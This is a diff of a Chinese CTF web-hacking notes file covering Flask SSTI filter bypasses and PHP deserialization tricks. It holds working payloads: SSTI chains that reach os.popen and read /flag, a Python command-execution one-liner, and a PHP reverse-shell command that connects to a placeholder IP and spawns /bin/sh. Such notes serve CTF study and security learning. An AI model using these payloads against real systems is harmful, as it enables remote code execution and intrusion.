@@ -72,6 +72,7 @@ for i in range(300,1000):
   - 当flask的{{}}被过滤时，可以用{%%}来绕过过滤。例题:[[GWCTF 2019]你的名字](https://blog.csdn.net/cjdgg/article/details/119813547),更多绕过方式可参考[此处](https://blog.csdn.net/miuzzx/article/details/110220425)
   - 最简单的getshell payload(配合eval): `__import__("os").popen("ls").read()`，来源:[[watevrCTF-2019]Supercalc](https://blog.csdn.net/a3320315/article/details/104272833)
   - 能发现flask注入需要大量`.`,`_`，如果被过滤了可以用`[]`替代`.`，16进制编码替代`_`。例如`{{()."__class__"."__bases__"[0]."__subclasses__"()[91]["get_data"](0, "/proc/self/fd/3")}}`绕过过滤的写法就是`{{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}`。例题:[[pasecactf_2019]flask_ssti](https://blog.csdn.net/qq_40800734/article/details/107011638)
+  - 有时候执行的命令在url里会被截断，可以通过传参的方式解决这个问题。`{{ "".__class__.__base__ .__subclasses__()[132].__init__.__globals__['popen'](request.args.get("cmd")).read()}}ge?cmd=cat /flag `
 
 - [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
@@ -1136,3 +1137,12 @@ function check($str){
 180. php也有整型溢出。例题:[茶歇区](https://blog.csdn.net/miuzzx/article/details/127830557#t16)
 181. AES的ECB模式下，一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序。甚至说，可以自己移除某一段密文，只要解密后的明文有效就行。例题:[龙珠NFT](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh)
 182. php环境下的反弹shell（reverse shell）命令。`php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'`.
+183. [被遗忘的反序列化](https://blog.csdn.net/qq_63928796/article/details/129968742#t1)
+- php反序列化漏洞。
+- `$_SERVER["HTTP_AAAAAA"]`表示请求header中`aaaaaa`字段的值。
+- [php原生类利用](https://www.anquanke.com/post/id/264823)：GlobIterator通过模式匹配遍历文件目录；SplFileObject读取指定文件内容。注意SplFileObject读取文件时是一行一行读的，所以直接`echo new SplFileObject(path)`只会出第一行的内容。似乎用伪协议就没有这个问题。
+184. python一句话木马：`__import__("os").popen("ls").read()`。
+185. [easy_php](https://blog.csdn.net/m0_64815693/article/details/130038356)
+- 使用C（custom object，类名类型）+ArrayObject（Serializable接口）绕过格式化字符串`/^[Oa]:[\d]+/i`过滤。注意此法无法绕过__wakeup。
+- 单纯C可以绕过__wakeup。O标识符代表对象类型，而C标识符代表类名类型。如果将O替换为C，则在反序列化时会将其解释为一个新的类名字符串，从而创建一个新的类而不是对象。因为这个新的类没有被序列化过，所以它没有任何属性或方法。这样一来，在反序列化时，__wakeup魔术方法就不会被自动调用。但这种方法不能有属性，那么只能触发__construct和__destruct。
+- 不过有C在的情况，会先检测这里类是否实现了Serializable接口。如果有的话，会将里面的值传入重写的unserialize方法。这是可以正常解析的，所以可以通过利用实现了Serializable接口的原生类，来解析正常解析里面的那一串。ArrayObject正是其中之一。
